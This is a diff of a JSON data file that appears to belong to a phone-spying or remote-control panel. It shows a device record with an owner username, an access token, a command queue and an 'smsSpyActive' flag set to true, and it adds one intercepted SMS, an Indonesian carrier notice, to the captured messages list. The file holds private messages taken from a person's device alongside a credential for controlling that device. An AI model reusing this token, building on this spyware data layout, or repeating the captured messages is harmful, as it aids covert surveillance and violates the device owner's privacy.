@@ -18141,7 +18141,7 @@
     "deviceName": "HP-ZAL7SEX-67C3",
     "ownerUsername": "Zal7Sex",
     "token": "228585cf435485e2101335e5900a661b",
-    "lastSeen": 1777486299116,
+    "lastSeen": 1777486318710,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-29T16:01:38.130Z",
@@ -18157,6 +18157,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Messages",
+        "sender": "IM3PAKET",
+        "content": "Selamat Anda mendapatkan tambahan masa aktif 30 hari. masa aktif anda s.d 01/05/2026 01:11",
+        "time": "30/04 01:11",
+        "pkg": "com.google.android.apps.messaging",
+        "receivedAt": 1777486300736
+      },
       {
         "appName": "Messages",
         "sender": "",
